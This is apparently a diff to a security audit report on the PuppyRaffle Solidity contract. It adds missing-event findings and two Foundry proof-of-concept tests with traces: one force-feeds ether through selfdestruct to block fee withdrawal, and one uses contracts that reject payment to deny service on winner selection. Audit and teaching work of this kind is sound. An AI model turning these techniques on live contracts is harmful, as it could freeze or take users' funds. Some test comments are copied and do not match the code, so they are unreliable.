@@ -273,6 +273,9 @@ uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty
 // @danger: raffle duration may occur too early after players entry because of this reset just after winner selection
 // Therefore, raffleStartTime should update into enterRaffle when there're at least 4 or more players into the raffle.
 raffleStartTime = block.timestamp;
+
+// @info: Missing WinnerSelected Event emission
+// @danger: off-chain tools i.e., APIs, analytics, may get desync from on-chain protocol.
 ```
 
 - withdrawFees:
@@ -283,6 +286,9 @@ raffleStartTime = block.timestamp;
 // and make the raffle active again each time whenever caller tries the call this function.
 // Parallelly, malicious user drains the contract's balance through refund function.
 require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+
+// @info: Missing FeesWithdrawn Event emission
+// @danger: off-chain tools i.e., APIs, analytics, may get desync from on-chain protocol.
 ```
 
 - _isActivePlayer:
@@ -1182,6 +1188,179 @@ constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) 
 ```
 
 - Note: Lottery lacks future plans, policy changes.
+
+### testAttackerCanKillItselfToRuinPuppyRaffleFeesWithdrawalFunctionality
+
+- Input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testAttackerCanKillItselfToRuinPuppyRaffleFeesWithdrawalFunctionality() public {
+    // Getting players ready to participate into raffle.
+    address[] memory newPlayers = new address[](4);
+
+    for (uint256 i; i < newPlayers.length; i++) {
+        newPlayers[i] = address(i + 1);
+    }
+
+    // Push players into raffle
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    // Now players array contains a zero address
+    // Pass the temporalloom
+    vm.warp(block.timestamp + duration + 15);
+    vm.roll(block.number + 3);
+
+    // Let's front-run the raffle to for the desired zero address as winner...
+    // Benefitting from the existing RNG BUG...
+
+    puppyRaffle.selectWinner();
+
+    KillContract killContract = new KillContract(address(puppyRaffle));
+    uint256 totalFees = puppyRaffle.totalFees();
+
+    console2.log("puppyRaffle balance before Kill  : ", address(puppyRaffle).balance);
+    console2.log("puppyRaffle totalFees before kill: ", totalFees);
+
+    // 0.900000000000000000
+    totalFees = puppyRaffle.totalFees();
+    killContract.killMe{value: 0.1 ether}();
+    console2.log("puppyRaffle balance after  Kill : ", address(puppyRaffle).balance);
+    console2.log("puppyRaffle totalFees after kill: ", totalFees);
+
+    vm.expectRevert();
+    puppyRaffle.withdrawFees();
+}
+```
+
+- Output:
+
+```bash
+...
+498251] PuppyRaffleTest::testAttackerCanKillItselfToRuinPuppyRaffleFeesWithdrawalFunctionality()
+    ├─ [145425] PuppyRaffle::enterRaffle{value: 4000000000000000000}([0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
+    │   ├─ emit RaffleEnter(newPlayers: [0x0000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000002, 0x0000000000000000000000000000000000000003, 0x0000000000000000000000000000000000000004])
+    │   └─ ← [Stop]
+    ├─ [0] VM::warp(86416 [8.641e4])
+    │   └─ ← [Return]
+    ├─ [0] VM::roll(4)
+    │   └─ ← [Return]
+    ├─ [212859] PuppyRaffle::selectWinner()
+    │   ├─ [3000] PRECOMPILES::ecrecover{value: 3200000000000000000}(0x)
+    │   │   └─ ← [Return] 0x
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ECRecover: [0x0000000000000000000000000000000000000001], tokenId: 0)
+    │   └─ ← [Stop]
+    ├─ [51704] → new KillContract@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 152 bytes of code
+    ├─ [1143] PuppyRaffle::totalFees() [staticcall]
+    │   └─ ← [Return] 800000000000000000 [8e17]
+    ├─ [0] console::log("puppyRaffle balance before Kill  : ", 800000000000000000 [8e17]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("puppyRaffle totalFees before kill: ", 800000000000000000 [8e17]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [1143] PuppyRaffle::totalFees() [staticcall]
+    │   └─ ← [Return] 800000000000000000 [8e17]
+    ├─ [5931] KillContract::killMe{value: 100000000000000000}()
+    │   └─ ← [SelfDestruct]
+    ├─ [0] console::log("puppyRaffle balance after  Kill : ", 900000000000000000 [9e17]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("puppyRaffle totalFees after kill: ", 800000000000000000 [8e17]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::expectRevert(custom error 0xf4844814)
+    │   └─ ← [Return]
+    ├─ [1229] PuppyRaffle::withdrawFees()
+    │   └─ ← [Revert] PuppyRaffle: There are currently players active!
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 875.29µs (146.27µs CPU time)
+
+Ran 1 test suite in 7.12ms (875.29µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+
+### testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin
+
+- Input: (Paste this test into: `test/PuppyRaffleTest.t.sol::PuppyRaffleTest`)
+
+```solidity
+function testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin() public {
+    // Getting players ready to participate into raffle.
+    address[] memory newPlayers = new address[](4);
+
+    KillContract killContract = new KillContract(address(puppyRaffle));
+    KillContract killContract2 = new KillContract(address(puppyRaffle));
+    KillContract killContract3 = new KillContract(address(puppyRaffle));
+    KillContract killContract4 = new KillContract(address(puppyRaffle));
+
+    newPlayers[0] = address(killContract);
+    newPlayers[1] = address(killContract2);
+    newPlayers[2] = address(killContract3);
+    newPlayers[3] = address(killContract4);
+
+    // Push players into raffle
+    puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(newPlayers);
+
+    // Now players array contains a zero address
+    // Pass the temporalloom
+    vm.warp(block.timestamp + duration + 15);
+    vm.roll(block.number + 3);
+
+    // Let's front-run the raffle to for the desired zero address as winner...
+    // Benefitting from the existing RNG BUG...
+
+    vm.expectRevert();
+    puppyRaffle.selectWinner();
+}
+```
+
+- Output:
+
+```bash
+...
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin() (gas: 482643)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 820.11µs (99.20µs CPU time)
+
+Ran 1 test suite in 4.45ms (820.11µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+theirrationalone@DESKTOP-MQASC83:~/first-flights-2026-07/2023-10-Puppy-Raffle$ forge test --mt testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin -vvvv
+[⠊] Compiling...
+No files changed, compilation skipped
+
+Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
+[PASS] testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin() (gas: 482643)
+Traces:
+  [578643] PuppyRaffleTest::testSmartContractsWithoutFallbackAndReceiveIntoRaffleCausesDoSOnRaffleSpin()
+    ├─ [51704] → new KillContract@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 152 bytes of code
+    ├─ [51704] → new KillContract@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 152 bytes of code
+    ├─ [51704] → new KillContract@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 152 bytes of code
+    ├─ [51704] → new KillContract@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   └─ ← [Return] 152 bytes of code
+    ├─ [145425] PuppyRaffle::enterRaffle{value: 4000000000000000000}([0x2e234DAe75C793f67A35089C9d99245E1C58470b, 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9, 0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   ├─ emit RaffleEnter(newPlayers: [0x2e234DAe75C793f67A35089C9d99245E1C58470b, 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9, 0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   └─ ← [Stop]
+    ├─ [0] VM::warp(86416 [8.641e4])
+    │   └─ ← [Return]
+    ├─ [0] VM::roll(4)
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf4844814)
+    │   └─ ← [Return]
+    ├─ [73248] PuppyRaffle::selectWinner()
+    │   ├─ [46] KillContract::fallback{value: 3200000000000000000}()
+    │   │   └─ ← [Revert] EvmError: Revert
+    │   └─ ← [Revert] PuppyRaffle: Failed to send prize pool to winner
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 823.88µs (123.92µs CPU time)
+
+Ran 1 test suite in 7.23ms (823.88µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+```
+
+
 
 
 
